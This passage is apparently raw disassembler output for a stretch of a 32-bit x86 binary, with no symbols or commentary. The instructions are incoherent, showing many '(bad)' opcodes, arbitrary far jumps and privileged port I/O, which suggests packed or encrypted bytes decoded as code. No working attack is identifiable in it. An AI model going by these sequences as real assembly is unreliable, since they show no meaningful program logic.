  41303b:	add    BYTE PTR [eax-0x4c147858],ah
  413041:	or     al,0x92
  413043:	aam    0xc5
  413045:	pop    edi
  413046:	jecxz  0x412fec
  413048:	aas    
  413049:	js     0x413023
  41304b:	call   0xf216:0x6048d887
  413052:	call   0x95fb:0x9be6f033
  413059:	aam    0x87
  41305b:	imul   ebx,edi,0x62b0084d
  413061:	jle    0x412ff4
  413063:	fadd   DWORD PTR [ebp+0x8fe4566]
  413069:	mov    dl,0x21
  41306b:	cs std 
  41306d:	test   eax,0x3c0b48c6
  413072:	xor    DWORD PTR [ecx-0x2cb8782],0xffffff98
  413079:	std    
  41307a:	xor    eax,0xe00baf21
  41307f:	dec    ebp
  413080:	mov    edx,0x95386467
  413085:	dec    eax
  413086:	(bad)  
  413087:	enter  0x87c9,0x94
  41308b:	stc    
  41308c:	in     eax,0xd7
  41308e:	mov    esp,0xbf0215f3
  413093:	pop    eax
  413094:	ja     0x4130b5
  413096:	push   0x32
  413098:	jl     0x4130ae
  41309a:	or     BYTE PTR [edx],ah
  41309c:	jmp    DWORD PTR [ecx+0x2]
  41309f:	push   eax
  4130a0:	sar    edx,cl
  4130a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130a3:	pop    ds
  4130a4:	add    DWORD PTR [ebx+esi*1],eax
  4130a7:	in     eax,0xd1
  4130a9:	or     eax,0x3ff49b9a
  4130ae:	pop    ecx
  4130af:	push   edi
  4130b0:	cli    
  4130b1:	dec    esi
  4130b2:	ret    0x1892
  4130b5:	inc    DWORD PTR [edx-0x1c]
  4130b8:	fbstp  TBYTE PTR [esi+0x63592345]
  4130be:	out    dx,al
  4130bf:	sbb    BYTE PTR [edx+0x73],bl
  4130c2:	and    cl,BYTE PTR ds:0x1b71530c
  4130c8:	ss adc eax,0x46d8a075
  4130ce:	adc    DWORD PTR ds:0xe307e2b7,esi
  4130d4:	sub    eax,0xa5240a07
  4130d9:	sbb    al,BYTE PTR [edx+esi*1+0x58]
  4130dd:	and    DWORD PTR [edx+0x4a7c3212],ebx
  4130e3:	call   0xe511:0x37790e1d
  4130ea:	pmulhuw mm3,QWORD PTR [ebx]
  4130ed:	inc    esp
  4130ee:	push   ebp
  4130ef:	std    
  4130f0:	adc    eax,0xd6fa9d9f
  4130f5:	dec    ebp
  4130f6:	ss add ax,0xad98
  4130fb:	mov    esp,0xe3f72c3a
  413100:	sbb    al,al
  413102:	pop    ss
  413103:	out    0xaa,eax
  413105:	pop    esi
  413106:	xor    al,0xb9
  413108:	dec    ecx
  413109:	sub    DWORD PTR [ebx-0x13],ecx
  41310c:	and    al,0xc7
  41310e:	bound  esi,QWORD PTR [ebx+0x18]
  413111:	pop    edx
  413112:	(bad)  
  413113:	sti    
  413114:	add    BYTE PTR [esi],dl
  413116:	sar    ch,0xa
  413119:	mov    al,ds:0xf2956341
  41311e:	js     0x413122
  413120:	inc    edx
  413121:	les    esi,FWORD PTR [edi]
  413123:	lods   al,BYTE PTR ds:[esi]
  413124:	push   0xaf9212d4
  413129:	adc    eax,0xa49171d5
  41312e:	dec    edi
  41312f:	ficomp WORD PTR [edx]
  413131:	jns    0x413134
  413133:	sub    edx,DWORD PTR ds:0x16105279
  413139:	addr16 int 0xc4
  41313c:	adc    ecx,ebp
  41313e:	mov    eax,ds:0x9d38ae11
  413143:	xchg   ebp,eax
  413144:	xchg   esp,eax
  413145:	lds    ebp,FWORD PTR [ebx+ebp*2]
  413148:	jnp    0x4131a3
  41314a:	dec    esi
  41314b:	pop    edi
  41314c:	imul   DWORD PTR [esi]
  41314e:	inc    esp
  41314f:	jb     0x41310c
  413151:	in     al,0xac
  413153:	mov    ah,0x25
  413155:	(bad)
  41315a:	cs mov edi,0x5067a769
  413160:	jmp    0x6a612494
  413165:	sbb    al,0x30
  413167:	sub    bl,BYTE PTR [ecx+0x320d7f66]
  41316d:	test   eax,0xcd522fb1
  413172:	dec    edi
  413173:	arpl   WORD PTR [ebx+0x2a6a0ee7],bx
  413179:	mov    ds:0xe4241fbf,eax
  41317e:	test   BYTE PTR [ecx-0x5dbada3],bh
  413184:	xor    ebp,DWORD PTR [eax]
  413186:	sub    cl,BYTE PTR [esp+esi*4]
  413189:	imul   ecx,DWORD PTR [esi+0x58],0x65
  41318d:	aas    
  41318e:	sbb    BYTE PTR [esi-0x51],al
  413191:	mov    esp,0x64cbc19c
  413196:	sub    esp,DWORD PTR [ebp+0xb5cb442]
  41319c:	mov    cl,0x8d
  41319e:	pop    ebp
  41319f:	pop    ecx
  4131a0:	stos   BYTE PTR es:[edi],al
  4131a1:	mov    ch,0x55
  4131a3:	push   edx
  4131a4:	dec    esp
  4131a5:	add    al,BYTE PTR [eax-0x3c6cd20c]
  4131ab:	div    DWORD PTR [esi]
  4131ad:	or     eax,0xc6e73a7e
  4131b2:	sti    
  4131b3:	ret    
  4131b4:	sbb    DWORD PTR [edi],ebp
  4131b6:	(bad)  
  4131b7:	loope  0x413186
  4131b9:	(bad)  
  4131ba:	fs push eax
  4131bc:	sti    
  4131bd:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4131bf:	mov    ds:0x583ae123,al
  4131c4:	mov    bh,0x47
  4131c6:	(bad)  
  4131c7:	cmp    al,0x59
  4131c9:	pushf  
  4131ca:	loopne 0x413155
  4131cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131cd:	mov    DWORD PTR [eax-0x19],esi
  4131d0:	bound  edi,QWORD PTR [eax+0x79658ca3]
  4131d6:	out    dx,eax
  4131d7:	fcom   st(2)
  4131d9:	ss cwde 
  4131db:	and    edi,DWORD PTR [eax]
  4131dd:	stos   BYTE PTR es:[edi],al
  4131de:	jns    0x4131a8
  4131e0:	mov    dh,0x3d
  4131e2:	sahf   
  4131e3:	shr    BYTE PTR [ebx+ebp*2],0xe0
  4131e7:	mov    dl,0xe0
  4131e9:	mov    edx,0x2baf11a9
  4131ee:	sub    BYTE PTR [edi+edx*2+0x67],al
  4131f2:	scas   eax,DWORD PTR es:[edi]
  4131f3:	mov    ds:0x385e9417,al
  4131f8:	es jecxz 0x4131ff
  4131fb:	sbb    BYTE PTR [ebx-0x40],al
  4131fe:	and    esi,ebx
  413200:	enter  0x47cf,0xcd
  413204:	push   ss
  413205:	cmp    dl,BYTE PTR [edx]
  413207:	inc    edx
  413208:	adc    DWORD PTR [ecx],esi
  41320a:	test   BYTE PTR [eax-0x5c56dada],ah
  413210:	pop    ss
  413211:	sahf   
  413212:	stos   BYTE PTR es:[edi],al
  413213:	push   ss
  413214:	xchg   ebp,eax
  413215:	add    DWORD PTR [esi-0x2681f183],ebp
  41321b:	in     al,dx
  41321c:	and    ch,dl
  41321e:	mov    ebx,0x389a0c93
  413223:	mov    dl,0xe2
  413225:	loop   0x41324f
  413227:	test   bl,al
  413229:	shl    DWORD PTR [esp+edx*4],1
  41322c:	(bad)  
  41322e:	cmp    eax,ebx
  413230:	lds    ebx,FWORD PTR [ecx+0x30f73a0e]
  413236:	xchg   BYTE PTR [eax-0x61],cl
  413239:	sub    ah,al
  41323b:	jnp    0x41320c
  41323d:	repnz xor eax,0x69d48587
  413243:	arpl   WORD PTR [ebx+0x76],bp
  413246:	in     eax,0xac
  413248:	fiadd  DWORD PTR [edx]
  41324a:	jp     0x413260
  41324c:	xor    ebx,edx
  41324e:	inc    ebx
  41324f:	rcr    cl,1
  413251:	out    0x7d,eax
  413253:	(bad)  
  413254:	pop    esi
  413255:	out    dx,eax
  413256:	pop    edi
  413257:	sbb    BYTE PTR ds:0xb192834d,al
  41325d:	iret   
  41325e:	fwait
  41325f:	movzx  edx,ah
  413262:	push   esi
  413263:	call   0xd757:0x8739f29
  41326a:	dec    esp
  41326b:	cdq    
  41326c:	sbb    eax,0xbc0f839a
  413271:	sub    DWORD PTR [eax-0x15bd1a3b],ebx
  413277:	dec    eax
  413278:	push   cs
  413279:	mov    ebx,ecx
  41327b:	mov    BYTE PTR [edx+0x2261f2b7],cl
  413281:	mov    bl,0xb4
  413283:	inc    esp
  413284:	mov    edi,edi
  413286:	call   0xb0fc:0xabd4cc19
  41328d:	mov    dl,0x9d
  41328f:	dec    ebp
  413290:	(bad)  
  413291:	xchg   ebx,eax
  413292:	pop    ebx
  413293:	lea    ecx,[ecx+0x603d8d7c]
  413299:	sbb    DWORD PTR [esi],edx
  41329b:	fidiv  DWORD PTR ds:0x4b8cda7
  4132a1:	cwde   
  4132a2:	popf   
  4132a3:	mov    edi,0x8528a44e
  4132a8:	pop    esp
  4132a9:	add    BYTE PTR ds:0xe6b4478a,bl
  4132af:	es (bad) 
  4132b1:	int    0xcd
  4132b3:	mov    cl,0x77
  4132b5:	shr    DWORD PTR [edx-0x3b],1
  4132b8:	push   edx
  4132b9:	pop    ebx
  4132ba:	adc    al,0x6
  4132bc:	loope  0x413263
  4132be:	ror    BYTE PTR [ebx+0x69cd311f],cl
  4132c4:	jo     0x413258
  4132c6:	adc    ch,bl
  4132c8:	sti    
  4132c9:	popa   
  4132ca:	cli    
  4132cb:	mov    eax,0x8451eb34
  4132d0:	xor    eax,0xb00a436b
  4132d5:	sbb    al,0x91
  4132d7:	mov    dl,0x66
  4132d9:	and    DWORD PTR [ebx],edi
  4132db:	pop    esi
  4132dc:	and    al,BYTE PTR [esi]
  4132de:	(bad)  
  4132e0:	ds scas ax,WORD PTR es:[edi]
  4132e3:	mov    eax,0xbb3a1c8e
  4132e8:	call   0xb849c33
  4132ed:	fbstp  TBYTE PTR [edx]
  4132ef:	mov    ebp,?
  4132f1:	mov    esp,0xce96868c
  4132f6:	and    ah,bh
  4132f8:	or     BYTE PTR [esi-0x6a6d9a1e],al
  4132fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132ff:	out    dx,al
  413300:	mov    edx,0xa2f56d69
  413305:	test   al,0xf2
  413307:	popf   
  413308:	dec    esp
  413309:	fs retf 0x6155
  41330d:	cmc    
  41330e:	mov    esi,0x113536fb
  413313:	scas   al,BYTE PTR es:[edi]
  413314:	out    dx,eax
  413315:	sti    
  413316:	and    DWORD PTR [eax-0x6c],0x2548fa8b
  41331d:	jecxz  0x413322
  41331f:	lods   eax,DWORD PTR ds:[esi]
  413320:	test   edx,ecx
  413322:	fld    TBYTE PTR [edx]
  413324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413325:	int    0x60
  413327:	out    dx,al
  413328:	push   esi
  413329:	cmp    al,BYTE PTR [esi]
  41332b:	ja     0x4132c1
  41332d:	aaa    
  41332e:	dec    ebx
  41332f:	mov    esi,0xca52266e
  413334:	in     eax,dx
  413335:	mov    al,ds:0x80b81611
  41333a:	mov    ebx,0xd0768659
  41333f:	les    edi,FWORD PTR [edx]
  413341:	jp     0x413307
  413343:	xchg   edi,eax
  413344:	cs ja  0x41339b
  413347:	push   ss
  413348:	sub    eax,0x7fdd456a
  41334d:	stos   DWORD PTR es:[edi],eax
  41334e:	mov    BYTE PTR [ecx],al
  413350:	xchg   edi,eax
  413351:	pop    ds
  413352:	mov    ah,0xbb
  413354:	or     edi,DWORD PTR [esi+0x2d]
  413357:	cld    
  413358:	in     eax,dx
  413359:	fdivp  st(4),st
  41335b:	popa   
  41335c:	sbb    al,0x7b
  41335e:	cmp    eax,0xf580425d
  413363:	loop   0x413394
  413365:	adc    DWORD PTR [eax-0x7e],0xffffffe5
  413369:	dec    ebx
  41336a:	mov    esp,DWORD PTR [ebx]
  41336c:	sbb    al,0x75
  41336e:	dec    edi
  41336f:	mov    ch,0xaf
  413371:	mov    ah,0xd
  413373:	push   es
  413374:	jmp    0xa778bd4d
  413379:	into   
  41337a:	sbb    eax,0xd0a9c760
  41337f:	into   
  413380:	mov    esi,0x3d34a9d9
  413385:	xlat   BYTE PTR ds:[ebx]
  413386:	ins    BYTE PTR es:[edi],dx
  413387:	sbb    bp,WORD PTR [ecx+edx*2]
  41338b:	jmp    0xa3f8:0x654b454c
  413392:	shl    DWORD PTR [ebx+esi*4],0x3
  413396:	loop   0x4133d4
  413398:	push   ecx
  413399:	mov    edx,0x23f4a6f1
  41339e:	sahf   
  41339f:	gs loop 0x413359
  4133a2:	mov    BYTE PTR [edx+0x31164713],al
  4133a8:	pushf  
  4133a9:	pop    ebx
  4133aa:	sar    dl,1
  4133ac:	push   0x965879f0
  4133b1:	cmp    bl,BYTE PTR [eax+0x6f]
  4133b4:	je     0x4133ca
  4133b6:	jo     0x4133df
  4133b8:	push   0xda90a305
  4133bd:	ss jmp 0x8d8:0xdb3cd61
  4133c5:	ss sahf 
  4133c7:	(bad)  
  4133c8:	rcr    esp,cl
  4133ca:	or     eax,0xa9f7b8ca
  4133cf:	sbb    DWORD PTR [edx+0x38536bd6],edi
  4133d5:	dec    esp
  4133d6:	xchg   ebp,eax
  4133d7:	fdivrp st(6),st
  4133d9:	fmulp  st(6),st
  4133db:	push   edx
  4133dc:	stc    
  4133dd:	sbb    al,0xeb
  4133df:	repz out 0x7,eax
  4133e2:	fstp   TBYTE PTR [edx+0x78]
  4133e5:	loop   0x4133e9
  4133e7:	mov    ecx,0x120a53ab
  4133ec:	sar    BYTE PTR [edx],0xb2
  4133ef:	lods   eax,DWORD PTR ds:[esi]
  4133f0:	sbb    bl,BYTE PTR [edi+0x68]
  4133f3:	aad    0xd7
  4133f5:	pop    ds
  4133f6:	adc    DWORD PTR [eax+edi*2-0x48636678],esi
  4133fd:	inc    eax
  4133fe:	mov    cl,0x98
  413400:	add    edi,DWORD PTR [ebp+0x21]
  413403:	xchg   edi,eax
  413404:	(bad)  
  413405:	pushf  
  413406:	or     ax,0xa45f
  41340a:	jnp    0x413395
  41340c:	repz mov ch,0x10
  41340f:	mov    cl,0xbb
  413411:	inc    ebp
  413412:	and    BYTE PTR [ebx],ch
  413414:	out    0x6b,al
  413416:	mov    ds:0xf0f335e3,eax
  41341b:	cdq    
  41341c:	cmp    al,0x7f
  41341e:	sbb    edx,edi
  413420:	and    esp,0x45dba8ae
  413426:	xor    BYTE PTR [edx],al
  413428:	or     eax,0xb96f5c91
  41342d:	dec    ebx
  41342e:	and    ax,0xe332
  413432:	je     0x413407
  413434:	xor    ebp,ecx
  413436:	inc    ebp
  413437:	xchg   ebx,eax
  413438:	clc    
  413439:	mov    DWORD PTR [esi+edx*4-0x64],edx
  41343d:	pop    ebp
  41343e:	(bad)  
  41343f:	xchg   ecx,eax
  413440:	jmp    0x413977f6
  413445:	jns    0x41348d
  413447:	inc    esi
  413448:	addr16 jl 0x4133f3
  41344b:	mov    ds:0x9236a5ef,eax
  413450:	xchg   ebx,eax
  413451:	sti    
  413452:	popf   
  413453:	jno    0x41343e
  413455:	xor    cl,BYTE PTR [ecx]
  413457:	aas    
  413458:	dec    ebp
  413459:	jl     0x4134a8
  41345b:	ins    BYTE PTR es:[edi],dx
  41345c:	in     al,0x17
  41345e:	pop    edx
  41345f:	mov    ah,0x15
  413461:	gs xchg esp,eax
  413463:	(bad)  
  413464:	xor    BYTE PTR [ebx-0x2c],dh
  413467:	out    dx,eax
  413468:	clc    
  413469:	pop    DWORD PTR [ebp+esi*2-0x13]
  41346d:	call   0xd3b2d904
  413472:	or     DWORD PTR [eax-0x5a2b799],esp
  413478:	(bad)  
  413479:	mov    BYTE PTR [eax+0x2e161365],bl
  41347f:	sub    edx,edx
  413481:	pop    edx
  413482:	iret   
  413483:	je     0x413459
  413485:	lods   eax,DWORD PTR ds:[esi]
  413486:	mov    al,ds:0x50752b8
  41348b:	xor    BYTE PTR [ebp+0xabbaf39],dl
  413491:	add    DWORD PTR [esi+0x56],0xffffff94
  413495:	sub    DWORD PTR [eax],edx
  413497:	mov    edi,0x4aa90a70
  41349c:	jmp    0xbe2b:0x2d895f1
  4134a3:	lea    edi,[ecx*4+0x13133c98]
  4134aa:	dec    edi
  4134ab:	jne    0x413478
  4134ad:	push   edx
  4134ae:	(bad)  
  4134af:	out    0xb3,al
  4134b1:	mov    edi,0x55dc296b
  4134b6:	jecxz  0x413471
  4134b8:	fmul   DWORD PTR [ebx]
  4134ba:	mov    ebp,0x27d81ec1
  4134bf:	or     eax,0xd7b26f3b
  4134c4:	(bad)  
  4134c5:	outs   dx,DWORD PTR ds:[esi]
  4134c6:	ins    BYTE PTR es:[edi],dx
  4134c7:	repnz scas al,BYTE PTR es:[edi]
  4134c9:	and    ebx,eax
  4134cb:	in     al,dx
  4134cc:	or     al,0x8b
  4134ce:	(bad)  [eax+eax*4+0x34]
  4134d2:	mov    bl,0x13
  4134d4:	inc    edx
  4134d5:	xor    eax,ebx
  4134d7:	mov    dl,0x39
  4134d9:	mov    edi,0xa0b01086
  4134de:	iret   
  4134df:	add    al,0xc
  4134e1:	test   al,0x11
  4134e3:	inc    esi
  4134e4:	stc    
  4134e5:	sbb    edx,DWORD PTR [edx-0x3e]
  4134e8:	lock retf 
  4134ea:	inc    edi
  4134eb:	cmp    edi,DWORD PTR [esi-0x5e14170b]
  4134f1:	or     ecx,DWORD PTR [eax+eiz*2-0x66aa16d6]
  4134f8:	out    0x64,eax
  4134fa:	mov    al,0xbf
  4134fc:	cmp    BYTE PTR [esi-0x4813014],bl
  413502:	or     ebx,DWORD PTR [ebx]
  413504:	xlat   BYTE PTR ds:[ebx]
  413505:	jge    0x4134d1
  413507:	sub    DWORD PTR [ebx+0x6a90dca8],ecx
  41350d:	in     eax,0x96
  41350f:	sahf   
  413510:	dec    esp
  413511:	aaa    
  413512:	lahf   
  413513:	sub    edi,ebp
  413515:	jle    0x413533
  413517:	loope  0x41355d
  413519:	mov    edx,0xdfccf2a4
  41351e:	and    ah,BYTE PTR [esi]
  413520:	icebp  
  413521:	stos   BYTE PTR es:[edi],al
  413522:	aaa    
  413523:	in     al,dx
  413524:	mov    al,ds:0x280d05c4
  413529:	test   al,0xfe
  41352b:	cmp    eax,0x18d5ef20
  413530:	jmp    0x38c6:0x8edd2e8c
  413537:	push   cs
  413538:	outs   dx,BYTE PTR ds:[esi]
  413539:	(bad)  
  41353a:	dec    edx
  41353b:	mov    dh,0x97
  41353d:	(bad)  
  41353e:	mov    ds:0x5b18979e,al
  413543:	sbb    BYTE PTR [ebx+0xa],bl
  413546:	cmp    DWORD PTR [edi],esi
  413548:	sbb    edi,edi
  41354a:	sub    ebx,DWORD PTR [esi+eiz*1-0x6d614ddd]
  413551:	aad    0xda
  413553:	jae    0x413572
  413555:	shr    eax,1
  413557:	push   0xdcf3a3c
  41355c:	pop    eax
  41355d:	icebp  
  41355e:	int3   
  41355f:	pop    ecx
  413560:	int    0x33
  413562:	xchg   esi,eax
  413563:	mov    DWORD PTR [edi-0x49e233c6],esp
  413569:	xor    DWORD PTR [ecx+eax*1],0xd556e73a
  413570:	add    BYTE PTR [ecx],bl
  413572:	jmp    0x90d4:0x12a292c3
  413579:	in     al,dx
  41357a:	xchg   ebx,eax
  41357b:	dec    eax
  41357c:	std    
  41357d:	xchg   BYTE PTR [edi],cl
  41357f:	lahf   
  413580:	jmp    0xe7874ab
  413585:	ficom  WORD PTR [eax]
  413587:	push   cs
  413588:	and    eax,0x87614c49
  41358d:	xchg   BYTE PTR [ecx],dh
  41358f:	or     eax,DWORD PTR [ebx-0x56652de0]
  413595:	pushf  
  413596:	mov    ds:0x12b4362d,al
  41359b:	inc    esi
  41359c:	fwait
  41359d:	les    ebx,FWORD PTR [ebx+ecx*1-0x6f]
  4135a1:	out    dx,eax
  4135a2:	mov    dl,0x72
  4135a4:	push   edx
  4135a5:	xchg   edx,eax
  4135a6:	fcmovnbe st,st(2)
  4135a8:	inc    edi
  4135a9:	jge    0x413545
  4135ab:	popa   
  4135ac:	inc    ebp
  4135ad:	int    0xee
  4135af:	or     eax,0x9969e146
  4135b4:	ss xor eax,0x40a8dcdd
  4135ba:	sbb    bl,BYTE PTR [esi]
  4135bc:	sbb    BYTE PTR [ecx],0x4c
  4135bf:	scas   eax,DWORD PTR es:[edi]
  4135c0:	xchg   esp,eax
  4135c1:	fnstsw WORD PTR [edi+0x26e26761]
  4135c7:	mov    dh,0x8d
  4135c9:	pop    esi
  4135ca:	fidivr WORD PTR [edx-0xd]
  4135cd:	and    cl,BYTE PTR [edi]
  4135cf:	and    edi,esi
  4135d1:	and    bh,bl
  4135d3:	test   al,0x4e
  4135d5:	inc    ebp
  4135d6:	addr16 jmp 0xb381e87d
  4135dc:	mov    bh,dl
  4135de:	test   BYTE PTR [ebx+0x7d],0x2c
  4135e2:	fxch   st(0)
  4135e4:	ja     0x413573
  4135e6:	jae    0x41362d
  4135e8:	out    0x77,al
  4135ea:	sub    ebp,DWORD PTR [edi-0x1f3ea712]
  4135f0:	dec    edi
  4135f1:	dec    edi
  4135f2:	inc    esi
  4135f3:	fsubr  st(6),st
  4135f5:	retf   
  4135f6:	jl     0x4135e6
  4135f8:	jns    0x4135c3
  4135fa:	adc    ebp,DWORD PTR [ecx]
  4135fc:	xchg   ebp,eax
  4135fd:	push   eax
  4135fe:	dec    edi
  4135ff:	rcr    DWORD PTR [eax-0x66],1
  413602:	sub    DWORD PTR [ebx+0x26],edx
  413605:	sub    BYTE PTR [ecx-0x6ab8ccc9],ch
  41360b:	push   edx
  41360c:	pop    es
  41360d:	jmp    0x41362d
  41360f:	adc    eax,0xe989b2aa
  413614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413615:	adc    al,0x45
  413617:	adc    DWORD PTR [eax],edx
  413619:	push   eax
  41361b:	xlat   BYTE PTR ds:[ebx]
  41361c:	ins    BYTE PTR es:[edi],dx
  41361d:	dec    ebp
  41361e:	dec    esp
  41361f:	push   esp
  413620:	aaa    
  413621:	and    al,0xbc
  413623:	enter  0x5377,0x88
  413627:	ss jno 0x413632
  41362a:	push   ecx
  41362b:	xor    DWORD PTR [esi-0x682b5d5a],ebx
  413631:	clc    
  413632:	pop    ebp
  413633:	pop    ebx
  413634:	lods   eax,DWORD PTR ds:[esi]
  413635:	jne    0x4135f8
  413637:	lods   al,BYTE PTR ds:[esi]
  413638:	ret    0xa652
  41363b:	jnp    0x4135d4
  41363d:	loop   0x413658
  41363f:	cmp    al,dh
  413641:	mov    cl,0x40
  413643:	das    
  413644:	mov    bh,0x65
  413646:	cmp    al,0xd5
  413648:	cmp    eax,0x85d30650
  41364d:	pop    ss
  41364e:	adc    DWORD PTR [edx+0x69],esp
  413651:	add    dl,BYTE PTR [edx-0xc40e80a]
  413657:	adc    BYTE PTR [ecx+0x3231dd7c],cl
  41365d:	mov    al,ds:0xc6a16f05
  413662:	sbb    al,0xd7
  413664:	iret   
  413665:	mov    edi,DWORD PTR [ecx]
  413667:	stc    
  413668:	inc    eax
  413669:	fistp  WORD PTR [esi+ebx*4+0x28264329]
  413670:	pop    ebx
  413671:	outs   dx,DWORD PTR ds:[esi]
  413672:	jns    0x413685
  413674:	mov    al,0x7d
  413676:	pop    ss
  413677:	outs   dx,BYTE PTR ds:[esi]
  413678:	stos   DWORD PTR es:[edi],eax
  413679:	jb     0x413661
  41367b:	inc    DWORD PTR ds:0xc74e3dd8
  413681:	icebp  
  413682:	ss cmp eax,0xe7d9e2f5
  413688:	adc    al,0xbb
  41368a:	mov    al,ds:0xea57f32e
  41368f:	loopne 0x41369b
  413691:	ficom  WORD PTR [ebx]
  413693:	cmp    al,0xcd
  413695:	mov    ch,0x39
  413697:	mov    ecx,0x6440118f
  41369c:	cwde   
  41369d:	popa   
  41369e:	xor    ecx,0xffffffe7
  4136a1:	mov    esi,esi
  4136a3:	shr    cl,0xb8
  4136a6:	mov    ah,0x5
  4136a8:	dec    edi
  4136a9:	nop
  4136aa:	mov    ecx,DWORD PTR [edi-0x5f]
  4136ad:	mov    DWORD PTR [edx-0xe],esi
  4136b0:	push   ds
  4136b1:	push   ebx
  4136b2:	scas   eax,DWORD PTR es:[edi]
  4136b3:	add    bl,BYTE PTR [ebp+0x1c]
  4136b6:	(bad)  
  4136b8:	fist   DWORD PTR [ebp-0xf]
  4136bb:	shr    BYTE PTR [esi],1
  4136bd:	jl     0x413701
  4136bf:	and    DWORD PTR [ebx-0x6d],edx
  4136c2:	(bad)  [ebp+0x6140c3c3]
  4136c8:	loop   0x4136b3
  4136ca:	nop
  4136cb:	push   esi
  4136cc:	arpl   WORD PTR [ecx-0x5bdc515],bx
  4136d2:	pushf  
  4136d3:	mov    ch,0xc5
  4136d5:	call   0xcf5d7203
  4136da:	cmp    al,0x2
  4136dc:	push   0x5420d320
  4136e1:	imul   edi,DWORD PTR [eax+0x27],0xffffffad
  4136e5:	into   
  4136e6:	aaa    
  4136e7:	iret   
  4136e8:	sahf   
  4136e9:	dec    ebp
  4136ea:	sbb    DWORD PTR [ebx+0x5a2e589b],eax
  4136f0:	and    ecx,DWORD PTR [esi-0x200aa387]
  4136f6:	push   ds
  4136f7:	aam    0x21
  4136f9:	cdq    
  4136fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136fb:	ror    BYTE PTR [edi],0xf7
  4136fe:	or     al,0x71
  413700:	shl    BYTE PTR [ebp-0x40ecca32],0xf5
  413707:	pop    esi
  413708:	icebp  
  413709:	dec    edi
  41370a:	fcomp  DWORD PTR [edi-0x1c9b3fae]
  413710:	dec    esi
  413711:	mov    ecx,0x93e552d4
  413716:	jo     0x4136d5
  413718:	rcl    bh,cl
  41371a:	dec    edx
  41371b:	dec    edi
  41371c:	jle    0x4136bb
  41371e:	xchg   esi,eax
  41371f:	daa    
  413720:	(bad)  
  413721:	dec    ebx
  413722:	pop    ebx
  413723:	mov    ebx,DWORD PTR [esi]
  413725:	push   es
  413726:	cmp    eax,0x9206ad52
  41372b:	push   ss
  41372c:	out    dx,al
  41372d:	dec    ecx
  41372e:	or     BYTE PTR [ebx-0x67],ch
  413731:	add    al,0x7
  413733:	stos   DWORD PTR es:[edi],eax
  413734:	adc    DWORD PTR [ecx],ebp
  413736:	inc    ebp
  413737:	xchg   ebp,eax
  413738:	or     BYTE PTR [eax],al
  41373a:	pop    sp
  41373c:	popa   
  41373d:	mov    BYTE PTR [ebp+0x74],bh
  413740:	inc    edx
  413741:	add    ebx,eax
  413743:	inc    edi
  413744:	repz leave 
  413746:	(bad)  
  413747:	popa   
  413748:	popf   
  413749:	les    esp,FWORD PTR [ebx]
  41374b:	cld    
  41374c:	xchg   edi,eax
  41374d:	adc    ebx,edi
  41374f:	gs push es
  413751:	loope  0x41370d
  413753:	cmp    DWORD PTR [ecx],edi
  413755:	and    ecx,DWORD PTR [edi-0x12]
  413758:	push   0x68ac992
  41375d:	rcr    BYTE PTR [edi-0x3],cl
  413760:	aaa    
  413761:	or     al,0x8a
  413763:	xchg   esp,esi
  413765:	and    eax,0xe319c12e
  41376a:	mov    ds:0x215471a0,eax
  41376f:	jne    0x4137ad
  413771:	jg     0x41378d
  413773:	xor    BYTE PTR [ecx+ecx*4],al
  413776:	inc    eax
  413777:	and    DWORD PTR [ebp-0x3d],edx
  41377a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41377b:	push   0x205aa89f
  413780:	mov    cl,0x71
  413782:	cwde   
  413783:	jmp    0xa3e7e31b
  413788:	pop    edi
  413789:	sahf   
  41378a:	xchg   esi,eax
  41378b:	pop    esi
  41378c:	stos   DWORD PTR es:[edi],eax
  41378d:	stc    
  41378e:	push   esi
  41378f:	fsubr  DWORD PTR [esi+0x598bffa2]
  413795:	pop    si
  413797:	aam    0x7b
  413799:	push   edi
  41379a:	lds    esp,FWORD PTR [ebp+0x6ccd1e89]
  4137a0:	mov    dh,0xda
  4137a2:	jns    0x4137bc
  4137a4:	sbb    BYTE PTR [edx+0x51],bh
  4137a7:	jo     0x41378d
  4137a9:	ds hlt 
  4137ab:	icebp  
  4137ac:	pop    ds
  4137ad:	test   DWORD PTR [esi-0x7e],edi
  4137b0:	push   ebx
  4137b1:	pop    ebx
  4137b2:	mov    cl,0x67
  4137b4:	pop    ecx
  4137b5:	xlat   BYTE PTR ds:[ebx]
  4137b6:	je     0x413788
  4137b8:	mov    eax,ds:0x17a08a1b
  4137bd:	sub    bh,BYTE PTR [edx-0x6fdf23c6]
  4137c3:	adc    BYTE PTR [eax],dh
  4137c5:	daa    
  4137c6:	push   0x1f
  4137c8:	outs   dx,BYTE PTR ds:[esi]
  4137c9:	xchg   ecx,eax
  4137ca:	adc    ebx,edi
  4137cc:	xchg   esi,eax
  4137cd:	sbb    BYTE PTR [edi],cl
  4137cf:	test   BYTE PTR [ecx-0x2ce1d53c],ch
  4137d5:	pop    ebp
  4137d6:	daa    
  4137d7:	add    eax,0x5e32ff56
  4137dd:	out    dx,eax
  4137de:	dec    ecx
  4137df:	leave  
  4137e0:	lods   al,BYTE PTR ds:[esi]
  4137e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137e2:	xchg   DWORD PTR [eax+0x4e4b852f],ebx
  4137e8:	stos   DWORD PTR es:[edi],eax
  4137e9:	mov    dh,ah
  4137eb:	xor    al,0x94
  4137ed:	popf   
  4137ee:	sar    BYTE PTR [edi],1
  4137f0:	ins    DWORD PTR es:[edi],dx
  4137f1:	pop    eax
  4137f2:	retf   
  4137f3:	adc    eax,0x59f97b9d
  4137f8:	test   DWORD PTR [ebx+0x5cc07c64],esp
  4137fe:	not    DWORD PTR [ebx+edx*1]
  413801:	test   al,0xa4
  413803:	inc    eax
  413804:	push   ebp
  413805:	mov    ?,WORD PTR [edx-0x20]
  413808:	daa    
  413809:	or     eax,0xe2273ede
  41380e:	stc    
  41380f:	xchg   ebx,eax
  413810:	in     al,0x9b
  413812:	dec    ecx
  413813:	sbb    bh,BYTE PTR [eax+0x6e]
  413816:	in     eax,dx
  413817:	dec    esp
  413818:	(bad)  
  413819:	in     al,dx
  41381a:	fdivr  DWORD PTR [esi]
  41381c:	pop    edx
